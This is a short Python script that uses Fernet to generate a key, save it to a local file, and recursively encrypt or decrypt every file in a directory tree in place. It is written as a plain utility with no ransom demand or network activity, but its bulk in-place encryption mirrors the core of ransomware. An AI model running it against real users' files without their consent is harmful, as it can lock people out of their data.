import os
import sys
from cryptography.fernet import Fernet


def generateKey():
    key = Fernet.generate_key()
    with open("thekey.key","wb") as thekey:
        thekey.write(key)


def readKey():
    with open("thekey.key","rb") as key:
        return key.read()


def encrypt_file(file, key):
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_encrypted)


def decrypt_file(file, key):
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_decrypted = Fernet(key).decrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_decrypted)


def encrypt_dir(directory_to_encrypt, key):
    for root, dirs, files in os.walk(directory_to_encrypt):
        for file in files:
            file_path = os.path.join(root, file)
            print(file_path)
            encrypt_file(file_path, key)

            
def decrypt_dir(directory_to_encrypt, key):
    for root, dirs, files in os.walk(directory_to_encrypt):
        for file in files:
            file_path = os.path.join(root, file)
            print(file_path)
            decrypt_file(file_path, key)